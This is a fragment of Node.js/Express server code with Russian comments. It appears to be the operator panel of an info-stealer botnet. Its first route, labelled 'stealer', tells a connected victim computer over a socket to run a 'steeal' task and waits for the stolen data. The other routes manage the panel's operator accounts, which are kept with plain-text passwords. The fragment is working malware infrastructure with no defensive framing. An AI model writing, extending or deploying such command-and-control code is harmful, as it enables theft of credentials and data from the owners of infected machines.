// === СТИЛЛЕР ===
app.post('/api/steeal/:id', requireAuth, (req, res) => {
    const { id } = req.params;
    const computer = computers.get(id);
    if (computer && computer.socketId) {
        const taskId = `stl_${Date.now()}_${Math.random()}`;
        pendingTransfers.set(taskId, { type: 'steeal', computerId: id, res });
        io.to(computer.socketId).emit('run_steeal', { taskId });
        setTimeout(() => {
            if (pendingTransfers.has(taskId)) {
                pendingTransfers.delete(taskId);
                res.status(408).json({ error: 'Timeout' });
            }
        }, 120000);
    } else res.status(404).json({ error: 'Computer offline' });
});

// Получение списка пользователей
app.get('/api/users', requireAuth, (req, res) => {
    const safeUsers = users.map(u => ({ id: u.id, username: u.username }));
    res.json(safeUsers);
});

// Добавление пользователя
app.post('/api/users', requireAuth, (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Need username and password' });
    const newId = users.length + 1;
    users.push({ id: newId, username, password });
    res.json({ success: true, user: { id: newId, username } });
});

// Удаление пользователя
app.delete('/api/users/:id', requireAuth, (req, res) => {
    const id = parseInt(req.params.id);
    const index = users.findIndex(u => u.id === id);
    if (index !== -1 && users[index].username !== 'admin') {
        users.splice(index, 1);
        res.json({ success: true });
    } else if (users[index]?.username === 'admin') {
        res.status(403).json({ error: 'Cannot delete admin' });
    } else {
        res.status(404).json({ error: 'User not found' });
    }
});
